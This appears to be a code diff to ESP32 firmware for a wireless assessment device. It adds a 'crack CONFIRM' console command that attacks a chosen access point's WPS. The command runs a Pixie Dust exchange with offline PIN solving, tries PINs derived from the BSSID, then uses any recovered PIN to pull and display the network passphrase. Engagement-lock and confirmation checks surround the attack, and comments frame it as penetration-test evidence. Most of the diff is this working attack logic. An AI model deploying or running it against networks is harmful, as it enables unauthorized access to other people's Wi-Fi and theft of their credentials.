@@ -26,6 +26,7 @@
 #include "touch.h"
 #include "transmit.h"
 #include "uartalarm.h"
+#include "wpsatk.h"
 #include "ui.h"
 
 #include "basanos/rbac.h"
@@ -33,6 +34,9 @@
 #include "basanos/score.h"
 #include "basanos/station.h"
 #include "basanos/target.h"
+#include "basanos/ie.h"
+#include "basanos/wpspin.h"
+#include "basanos/pixie.h"
 
 #include "driver/gpio.h"
 #include "esp_event.h"
@@ -400,6 +404,7 @@ static void console_help(void)
     bas_console_reply("scan                     re-survey the band");
     bas_console_reply("list                     networks, with index");
     bas_console_reply("wps                      WPS exposure survey (passive)");
+    bas_console_reply("crack CONFIRM            recover the target's WPS PIN + key");
     bas_console_reply("lock <idx> <label>       lock an engagement");
     bas_console_reply("unlock                   drop it");
     bas_console_reply("fams                     families, with index");
@@ -484,6 +489,171 @@ static void console_fams(void)
  * What it deliberately does not do is recover the PIN or the passphrase. The
  * remediation for every line below is the same sentence -- "turn WPS off" --
  * and knowing the credential does not change it. */
+/* WPS PIN recovery against the locked target.
+ *
+ * Three attacks, cheapest first, and the order is the whole design:
+ *
+ *   1. Pixie Dust. ONE exchange. The access point hands over M4 before it can
+ *      have validated anything, and M4 carries the hashes the offline solver
+ *      inverts. Costs one attempt against a lockout counter, so it runs first
+ *      even though it is the most sophisticated.
+ *   2. Derived default PINs. A dozen attempts, because a great many access
+ *      points compute their PIN from a BSSID they broadcast continuously.
+ *   3. Exhaustive. Eleven thousand attempts, offered but not run by default:
+ *      at the rate an AP answers this is many hours and almost every modern
+ *      firmware locks out long before the end.
+ *
+ * The credential is displayed. That is the point of the feature -- a finding
+ * that says "WPS is enabled" gets filed, and the network's own passphrase on
+ * a slide gets it turned off. Both describe the same defect; only one is
+ * believed. It is never written to the SD log, because a report needs the
+ * finding and an engagement has no reason to keep custody of the key. */
+__attribute__((noinline))
+static void console_crack(const bas_cmd_t *c)
+{
+    if (!s_engage.locked) {
+        bas_console_reply("no engagement — 'lock <idx> <label>' first");
+        return;
+    }
+    if (bas_engage_remaining_ms(&s_engage, now_ms()) == 0u) {
+        bas_console_reply("engagement expired");
+        return;
+    }
+    if (!c->confirm) {
+        bas_console_reply("This associates with %s and attempts to recover its",
+                          s_engage.target.hidden ? "(hidden)"
+                                                 : s_engage.target.ssid);
+        bas_console_reply("WPS PIN and passphrase. It is loud, the AP logs it,");
+        bas_console_reply("and failed attempts may lock its WPS out for hours.");
+        bas_console_reply("Repeat with CONFIRM.");
+        return;
+    }
+
+    const bas_ap_t *t = &s_engage.target;
+    if (!t->wps.present) {
+        /* Not a refusal: an AP can run WPS without advertising it, and the
+         * beacon may simply not have been re-read since. Say which it is. */
+        bas_console_reply("target advertises no WPS element — trying anyway,");
+        bas_console_reply("since an AP may run WPS without announcing it.");
+    } else if (t->wps.locked) {
+        bas_console_reply("target advertises WPS LOCKED — attempts will fail");
+        bas_console_reply("until the lockout expires. Continuing.");
+    }
+
+    /* Static, not automatic: each of these carries 512 bytes of Pixie
+     * material, and three stack copies overflowed the main task. Only one
+     * recovery runs at a time -- the console is single-threaded and the run
+     * is synchronous -- so file scope is correct here rather than merely
+     * cheaper. */
+    static bas_wpsatk_result_t r;
+    memset(&r, 0, sizeof(r));
+
+    /* --- 1: one exchange, for the offline attack --------------------------- */
+    bas_console_reply("");
+    bas_console_reply("[1/3] Pixie Dust — one exchange, then offline");
+    esp_err_t rc = bas_wpsatk_try(12345670u, 30000u, &r);
+
+    if (r.have_material) {
+        bas_console_reply("      captured M1..M4 material");
+        bas_pixie_run(&r.material, &r.pixie);
+        if (r.pixie.found) {
+            bas_console_reply("      PIN RECOVERED: %08u",
+                              (unsigned)r.pixie.pin);
+            bas_console_reply("      cause: %s",
+                              bas_pixie_vuln_name(r.pixie.vuln));
+            bas_console_reply("      %s",
+                              bas_pixie_vuln_detail(r.pixie.vuln));
+
+            /* The PIN is the finding; the passphrase is the proof. One more
+             * exchange, with the real PIN, and the AP volunteers it. */
+            static bas_wpsatk_result_t g;
+            memset(&g, 0, sizeof(g));
+            bas_console_reply("      redeeming the PIN for the credential...");
+            (void)bas_wpsatk_try(r.pixie.pin, 30000u, &g);
+            if (g.have_cred) {
+                bas_console_reply("");
+                bas_console_reply("      SSID:       %s", g.ssid);
+                bas_console_reply("      PASSPHRASE: %s", g.passphrase);
+                bas_console_reply("");
+                bas_console_reply("      Not logged to SD. Copy it now if the "
+                                  "report needs it.");
+                return;
+            }
+            bas_console_reply("      PIN recovered but the AP did not return a");
+            bas_console_reply("      credential. The PIN alone is the finding.");
+            return;
+        }
+        bas_console_reply("      not vulnerable: the registrar's secret nonces");
+        bas_console_reply("      were not any value a broken generator makes");
+        bas_console_reply("      (%u candidates tested)",
+                          (unsigned)r.pixie.tried);
+    } else {
+        bas_console_reply("      no material — the exchange did not reach M4");
+        bas_console_reply("      (rc=%s). The AP may not accept an external",
+                          esp_err_to_name(rc));
+        bas_console_reply("      enrollee unless WPS was started on it.");
+    }
+    if (r.have_cred) {
+        /* 12345670 is a real default, so the throwaway PIN sometimes works. */
+        bas_console_reply("");
+        bas_console_reply("      the probe PIN 12345670 was ACCEPTED — that is");
+        bas_console_reply("      the vendor default, never changed.");
+        bas_console_reply("      SSID:       %s", r.ssid);
+        bas_console_reply("      PASSPHRASE: %s", r.passphrase);
+        return;
+    }
+
+    /* --- 2: PINs derived from the BSSID ------------------------------------ */
+    bas_pin_cand_t cand[BAS_MAX_PIN_CANDS];
+    int n = bas_wps_pin_candidates(t->bssid, cand, BAS_MAX_PIN_CANDS);
+    bas_console_reply("");
+    bas_console_reply("[2/3] derived PINs — %d candidates from the BSSID", n);
+
+    for (int i = 0; i < n; i++) {
+        if (s_abort) {
+            bas_console_reply("      aborted at %d/%d", i, n);
+            return;
+        }
+        static bas_wpsatk_result_t a;
+        memset(&a, 0, sizeof(a));
+        bas_console_reply("      %2d/%d  %08u  (%s)", i + 1, n,
+                          (unsigned)cand[i].pin,
+                          bas_pinalg_name(cand[i].alg));
+        (void)bas_wpsatk_try(cand[i].pin, 20000u, &a);
+
+        if (a.have_cred) {
+            bas_console_reply("");
+            bas_console_reply("      PIN ACCEPTED: %08u",
+                              (unsigned)cand[i].pin);
+            bas_console_reply("      derivation:   %s",
+                              bas_pinalg_name(cand[i].alg));
+            bas_console_reply("      The PIN was computable from the BSSID the");
+            bas_console_reply("      AP broadcasts, so it was never a secret.");
+            bas_console_reply("");
+            bas_console_reply("      SSID:       %s", a.ssid);
+            bas_console_reply("      PASSPHRASE: %s", a.passphrase);
+            return;
+        }
+        if (a.m2d > 0u) {
+            /* A run of M2D is the AP refusing to talk. Continuing spends
+             * attempts that are already being rejected. */
+            bas_console_reply("      AP is refusing registrars — locked out.");
+            bas_console_reply("      Stopping: further attempts extend the "
+                              "lockout.");
+            return;
+        }
+    }
+
+    bas_console_reply("");
+    bas_console_reply("[3/3] exhaustive search — 11,000 attempts, not started");
+    bas_console_reply("      At the rate this AP answers that is many hours and");
+    bas_console_reply("      most firmware locks out long before the end. The");
+    bas_console_reply("      two attacks above are the ones worth reporting.");
+    bas_console_reply("");
+    bas_console_reply("no PIN recovered. That is a finding: this AP's WPS did");
+    bas_console_reply("not fall to either cheap attack.");
+}
+
 static void console_wps(void)
 {
     if (s_scan.count == 0) {
@@ -491,7 +661,7 @@ static void console_wps(void)
         return;
     }
 
-    unsigned exposed = 0, locked = 0, none = 0;
+    unsigned exposed = 0, locked = 0, none = 0, pin_seen = 0;
 
     bas_console_reply("WPS survey — %u network(s), nothing transmitted",
                       (unsigned)s_scan.count);
@@ -508,6 +678,9 @@ static void console_wps(void)
             locked++;
         } else {
             exposed++;
+            if (r == BAS_WPS_PIN_OPEN || r == BAS_WPS_REGISTRAR) {
+                pin_seen++;
+            }
         }
 
         bas_console_reply("");
@@ -580,8 +753,20 @@ static void console_wps(void)
     } else {
         bas_console_reply("%u EXPOSED, %u locked, %u without WPS",
                           exposed, locked, none);
-        bas_console_reply("an exposed PIN method yields the passphrase. "
-                          "Basanos reports it and stops there.");
+        /* Only claim a PIN method where one was actually advertised. Most
+         * beacons omit Config Methods entirely, and saying "an exposed PIN
+         * method" about those would put a finding in a report that the
+         * evidence does not support. */
+        if (pin_seen > 0u) {
+            bas_console_reply("%u advertise a PIN method: recoverable, and it "
+                              "yields the passphrase.", pin_seen);
+        }
+        if (exposed > pin_seen) {
+            bas_console_reply("the rest are enabled and unlocked but do not "
+                              "announce their methods —");
+            bas_console_reply("'crack CONFIRM' against a locked target settles "
+                              "it.");
+        }
     }
 }
 
@@ -728,6 +913,7 @@ static void console_exec(const bas_cmd_t *c)
     case CMD_FAMS:   console_fams();   break;
     case CMD_CARD:   console_card();   break;
     case CMD_WPS:    console_wps();    break;
+    case CMD_CRACK:  console_crack(c);  break;
     case CMD_ABORT:  s_abort = true; bas_console_reply("abort set"); break;
     case CMD_RUN:    console_run(c);   break;
 
@@ -1197,6 +1383,12 @@ void app_main(void)
 
     bas_selftest_t st;
     bas_selftest_run(&st);
+    /* Selftest is the deepest the main task ever goes -- it holds several
+     * scan entries and engagements across merged frames. Logging the low
+     * water mark here is what turns "it reboots on the bench" into a number:
+     * growing bas_ap_t once took this straight through an 8 KB stack. */
+    ESP_LOGI(TAG, "main stack low water: %u bytes free",
+             (unsigned)uxTaskGetStackHighWaterMark(NULL));
     bas_ui_selftest(&st);
     vTaskDelay(pdMS_TO_TICKS(2000));
     if (!bas_selftest_ok(&st)) {
